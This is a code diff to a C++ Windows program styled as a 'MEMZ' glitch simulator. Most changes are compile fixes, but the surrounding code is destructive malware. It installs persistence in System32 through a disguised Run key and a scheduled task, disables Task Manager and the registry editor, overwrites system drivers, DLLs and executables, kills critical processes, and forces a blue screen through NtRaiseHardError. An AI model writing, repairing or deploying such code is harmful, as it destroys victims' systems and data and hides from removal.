@@ -2,16 +2,16 @@
 #include <cstdlib>
 #include <ctime>
 #include <cmath>
-#include <mmsystem.h>
 #include <thread>
 #include <vector>
 #include <algorithm>
-#include <dwmapi.h>
-#include <wingdi.h>
 #include <fstream>
 #include <sstream>
 #include <iomanip>
 #include <cctype>
+#include <mmsystem.h>
+#include <dwmapi.h>
+#include <wingdi.h>
 #include <winternl.h>
 #include <psapi.h>
 #include <shlobj.h>
@@ -197,7 +197,7 @@ void ApplyCursorEffect() {
             
             if (dist < cursorSize) {
                 int pos = (y * screenWidth + x) * 4;
-                if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
+                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                     pPixels[pos] = 255 - pPixels[pos];
                     pPixels[pos + 1] = 255 - pPixels[pos + 1];
                     pPixels[pos + 2] = 255 - pPixels[pos + 2];
@@ -212,7 +212,7 @@ void ApplyCursorEffect() {
                         
                         if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
                             int srcPos = (srcY * screenWidth + srcX) * 4;
-                            if (srcPos >= 0 && srcPos < screenWidth * screenHeight * 4 - 4) {
+                            if (srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                 pPixels[pos] = pPixels[srcPos];
                                 pPixels[pos + 1] = pPixels[srcPos + 1];
                                 pPixels[pos + 2] = pPixels[srcPos + 2];
@@ -256,7 +256,7 @@ void UpdateParticles() {
                         int pyPos = y + py;
                         if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
                             int pos = (pyPos * screenWidth + pxPos) * 4;
-                            if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
+                            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                 pPixels[pos] = GetBValue(it->color);
                                 pPixels[pos + 1] = GetGValue(it->color);
                                 pPixels[pos + 2] = GetRValue(it->color);
@@ -282,8 +282,8 @@ void ApplyMeltingEffect(BYTE* originalPixels) {
                 int srcPos = (y * screenWidth + x) * 4;
                 int dstPos = (targetY * screenWidth + x) * 4;
                 
-                if (srcPos >= 0 && srcPos < screenWidth * screenHeight * 4 - 4 &&
-                    dstPos >= 0 && dstPos < screenWidth * screenHeight * 4 - 4) {
+                if (srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 &&
+                    dstPos >= 0 && dstPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                     pPixels[dstPos] = originalPixels[srcPos];
                     pPixels[dstPos + 1] = originalPixels[srcPos + 1];
                     pPixels[dstPos + 2] = originalPixels[srcPos + 2];
@@ -382,7 +382,7 @@ void ApplyPixelSorting() {
         std::vector<std::pair<float, int>> brightness;
         for (int x = startX; x < endX; x++) {
             int pos = (y * screenWidth + x) * 4;
-            if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
+            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                 float brt = 0.299f * pPixels[pos+2] + 0.587f * pPixels[pos+1] + 0.114f * pPixels[pos];
                 brightness.push_back(std::make_pair(brt, x));
             }
@@ -401,7 +401,7 @@ void ApplyPixelSorting() {
         
         for (int x = startX; x < endX; x++) {
             int pos = (y * screenWidth + x) * 4;
-            if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
+            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                 int idx = (x - startX) * 4;
                 pPixels[pos] = sortedLine[idx];
                 pPixels[pos+1] = sortedLine[idx+1];
@@ -423,7 +423,7 @@ void ApplyStaticBars() {
         for (int y = barY; y < barY + barHeightActual; y++) {
             for (int x = 0; x < screenWidth; x++) {
                 int pos = (y * screenWidth + x) * 4;
-                if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
+                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                     if (rand() % 3 == 0) {
                         pPixels[pos] = rand() % 256;
                         pPixels[pos+1] = rand() % 256;
@@ -452,7 +452,7 @@ void ApplyInversionWaves() {
                 float wave = sin(dist * 0.1f - currentTime * 0.005f * speed) * 0.5f + 0.5f;
                 if (wave > 0.7f) {
                     int pos = (y * screenWidth + x) * 4;
-                    if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
+                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                         pPixels[pos] = 255 - pPixels[pos];
                         pPixels[pos+1] = 255 - pPixels[pos+1];
                         pPixels[pos+2] = 255 - pPixels[pos+2];
@@ -470,13 +470,13 @@ void InstallPersistence() {
     
     TCHAR sysDir[MAX_PATH];
     GetSystemDirectory(sysDir, MAX_PATH);
-    lstrcat(sysDir, "\\winlogon_helper.exe");
+    lstrcat(sysDir, TEXT("\\winlogon_helper.exe"));
     CopyFile(szPath, sysDir, FALSE);
     
     HKEY hKey;
-    RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+    RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 
                    0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
-    RegSetValueEx(hKey, "SystemHealthMonitor", 0, REG_SZ, (BYTE*)sysDir, lstrlen(sysDir) * sizeof(TCHAR));
+    RegSetValueEx(hKey, TEXT("SystemHealthMonitor"), 0, REG_SZ, (BYTE*)sysDir, (lstrlen(sysDir) + 1) * sizeof(TCHAR));
     RegCloseKey(hKey);
     
     SYSTEMTIME st;
@@ -484,7 +484,7 @@ void InstallPersistence() {
     
     TCHAR cmd[1024];
     wsprintf(cmd, 
-        "schtasks /create /tn \"Windows Integrity Check\" /tr \"\\\"%s\\\"\" /sc minute /mo 1 /st %02d:%02d /f",
+        TEXT("schtasks /create /tn \"Windows Integrity Check\" /tr \"\\\"%s\\\"\" /sc minute /mo 1 /st %02d:%02d /f"),
         sysDir, st.wHour, st.wMinute);
     
     WinExec(cmd, SW_HIDE);
@@ -494,15 +494,15 @@ void InstallPersistence() {
 
 void DisableSystemTools() {
     HKEY hKey;
-    RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+    RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 
                    0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
     DWORD value = 1;
-    RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+    RegSetValueEx(hKey, TEXT("DisableTaskMgr"), 0, REG_DWORD, (BYTE*)&value, sizeof(value));
     RegCloseKey(hKey);
     
-    RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+    RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 
                    0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
-    RegSetValueEx(hKey, "DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+    RegSetValueEx(hKey, TEXT("DisableRegistryTools"), 0, REG_DWORD, (BYTE*)&value, sizeof(value));
     RegCloseKey(hKey);
     
     disableTaskManager = true;
@@ -511,9 +511,9 @@ void DisableSystemTools() {
 
 void CorruptSystemFiles() {
     const TCHAR* targets[] = {
-        "C:\\Windows\\System32\\drivers\\*.sys",
-        "C:\\Windows\\System32\\*.dll",
-        "C:\\Windows\\System32\\*.exe"
+        TEXT("C:\\Windows\\System32\\drivers\\*.sys"),
+        TEXT("C:\\Windows\\System32\\*.dll"),
+        TEXT("C:\\Windows\\System32\\*.exe")
     };
     
     for (int i = 0; i < 3; i++) {
@@ -525,9 +525,9 @@ void CorruptSystemFiles() {
                 if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                     TCHAR filePath[MAX_PATH];
                     if (i == 0) {
-                        wsprintf(filePath, "C:\\Windows\\System32\\drivers\\%s", fd.cFileName);
+                        wsprintf(filePath, TEXT("C:\\Windows\\System32\\drivers\\%s"), fd.cFileName);
                     } else {
-                        wsprintf(filePath, "C:\\Windows\\System32\\%s", fd.cFileName);
+                        wsprintf(filePath, TEXT("C:\\Windows\\System32\\%s"), fd.cFileName);
                     }
                     
                     HANDLE hFile = CreateFile(filePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
@@ -558,15 +558,15 @@ void CorruptSystemFiles() {
 
 void KillCriticalProcesses() {
     const TCHAR* targets[] = {
-        "taskmgr.exe",
-        "explorer.exe",
-        "msconfig.exe",
-        "cmd.exe",
-        "powershell.exe",
-        "regedit.exe",
-        "mmc.exe",
-        "services.exe",
-        "svchost.exe"
+        TEXT("taskmgr.exe"),
+        TEXT("explorer.exe"),
+        TEXT("msconfig.exe"),
+        TEXT("cmd.exe"),
+        TEXT("powershell.exe"),
+        TEXT("regedit.exe"),
+        TEXT("mmc.exe"),
+        TEXT("services.exe"),
+        TEXT("svchost.exe")
     };
     
     DWORD processes[1024], cbNeeded;
@@ -600,7 +600,7 @@ void KillCriticalProcesses() {
 }
 
 void TriggerBSOD() {
-    HMODULE ntdll = GetModuleHandle("ntdll.dll");
+    HMODULE ntdll = GetModuleHandle(TEXT("ntdll.dll"));
     if (ntdll) {
         typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
         pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
@@ -653,14 +653,13 @@ void ApplyGlitchEffect() {
             if (xOffset > 0) {
                 int copySize = (screenWidth - xOffset) * 4;
                 if (copySize > 0) {
-                    memmove_s(dest + xOffset * 4, 
-                             (screenWidth * 4) - (xOffset * 4),
-                             source, 
-                             copySize);
+                    memmove(dest + xOffset * 4, 
+                            source, 
+                            copySize);
                 }
                 for (int x = 0; x < xOffset; x++) {
                     int pos = (currentY * screenWidth + x) * 4;
-                    if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
+                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                         pPixels[pos] = rand() % 256;
                         pPixels[pos + 1] = rand() % 256;
                         pPixels[pos + 2] = rand() % 256;
@@ -671,14 +670,13 @@ void ApplyGlitchEffect() {
                 int absOffset = -xOffset;
                 int copySize = (screenWidth - absOffset) * 4;
                 if (copySize > 0) {
-                    memmove_s(dest, 
-                             screenWidth * 4,
-                             source + absOffset * 4, 
-                             copySize);
+                    memmove(dest, 
+                            source + absOffset * 4, 
+                            copySize);
                 }
                 for (int x = screenWidth - absOffset; x < screenWidth; x++) {
                     int pos = (currentY * screenWidth + x) * 4;
-                    if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
+                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                         pPixels[pos] = rand() % 256;
                         pPixels[pos + 1] = rand() % 256;
                         pPixels[pos + 2] = rand() % 256;
@@ -717,7 +715,7 @@ void ApplyGlitchEffect() {
                 
                 if (effectiveWidth > 0 && dest >= pPixels && 
                     dest + effectiveWidth * 4 <= pPixels + screenWidth * screenHeight * 4) {
-                    memcpy_s(dest, effectiveWidth * 4, source, effectiveWidth * 4);
+                    memcpy(dest, source, effectiveWidth * 4);
                 }
             }
         }
@@ -732,7 +730,7 @@ void ApplyGlitchEffect() {
         int y = rand() % screenHeight;
         int pos = (y * screenWidth + x) * 4;
         
-        if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
+        if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
             pPixels[pos] = rand() % 256;
             pPixels[pos + 1] = rand() % 256;
             pPixels[pos + 2] = rand() % 256;
@@ -768,8 +766,8 @@ void ApplyGlitchEffect() {
                         int srcPos = (srcY * screenWidth + srcX) * 4;
                         int destPos = (y * screenWidth + x) * 4;
                         
-                        if (destPos >= 0 && destPos < screenWidth * screenHeight * 4 - 4 && 
-                            srcPos >= 0 && srcPos < screenWidth * screenHeight * 4 - 4) {
+                        if (destPos >= 0 && destPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 && 
+                            srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                             pPixels[destPos] = pCopy[srcPos];
                             pPixels[destPos + 1] = pCopy[srcPos + 1];
                             pPixels[destPos + 2] = pCopy[srcPos + 2];
@@ -787,7 +785,7 @@ void ApplyGlitchEffect() {
                 if (y + h >= screenHeight) break;
                 for (int x = 0; x < screenWidth; x++) {
                     int pos = ((y + h) * screenWidth + x) * 4;
-                    if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
+                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                         pPixels[pos] = std::min(pPixels[pos] + 100, 255);
                         pPixels[pos + 1] = std::min(pPixels[pos + 1] + 100, 255);
                         pPixels[pos + 2] = std::min(pPixels[pos + 2] + 100, 255);
@@ -798,8 +796,8 @@ void ApplyGlitchEffect() {
     }
     
     if (intensityLevel > 0 && (rand() % std::max(1, 20 / intensityLevel)) == 0) {
-        for (int i = 0; i < screenWidth * screenHeight * 4; i += 4) {
-            if (i < screenWidth * screenHeight * 4 - 4) {
+        for (int i = 0; i < static_cast<int>(screenWidth * screenHeight * 4); i += 4) {
+            if (i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                 pPixels[i] = 255 - pPixels[i];
                 pPixels[i + 1] = 255 - pPixels[i + 1];
                 pPixels[i + 2] = 255 - pPixels[i + 2];
@@ -966,9 +964,9 @@ void RunBackgroundProcess() {
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
     // Cek jika sudah berjalan
-    HANDLE hMutex = CreateMutex(NULL, TRUE, "Global\\WinlogonHelperMutex");
+    HANDLE hMutex = CreateMutex(NULL, TRUE, TEXT("Global\\WinlogonHelperMutex"));
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
-        if (__argc > 1 && lstrcmpi(__argv[1], "-background") == 0) {
+        if (__argc > 1 && lstrcmpiA(__argv[1], "-background") == 0) {
             return 0;
         }
         
@@ -977,7 +975,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
         
         SHELLEXECUTEINFO sei = { sizeof(sei) };
         sei.lpFile = szPath;
-        sei.lpParameters = "-background";
+        sei.lpParameters = TEXT("-background");
         sei.nShow = SW_HIDE;
         ShellExecuteEx(&sei);
         return 0;
@@ -987,7 +985,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
     startTime = GetTickCount();
     
     // Jalankan background process
-    if (__argc > 1 && lstrcmpi(__argv[1], "-background") == 0) {
+    if (__argc > 1 && lstrcmpiA(__argv[1], "-background") == 0) {
         RunBackgroundProcess();
         return 0;
     }
@@ -1000,14 +998,14 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
         CS_HREDRAW | CS_VREDRAW, 
         WndProc,
         0, 0, hInst, NULL, NULL, NULL, NULL,
-        "MEMZ_GLITCH_SIM", NULL
+        TEXT("MEMZ_GLITCH_SIM"), NULL
     };
     RegisterClassEx(&wc);
     
     HWND hwnd = CreateWindowEx(
         WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
         wc.lpszClassName, 
-        "CRITICAL SYSTEM FAILURE",
+        TEXT("CRITICAL SYSTEM FAILURE"),
         WS_POPUP, 
         0, 0, 
         GetSystemMetrics(SM_CXSCREEN), 
@@ -1030,7 +1028,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
     
     SHELLEXECUTEINFO sei = { sizeof(sei) };
     sei.lpFile = szPath;
-    sei.lpParameters = "-background";
+    sei.lpParameters = TEXT("-background");
     sei.nShow = SW_HIDE;
     ShellExecuteEx(&sei);
     
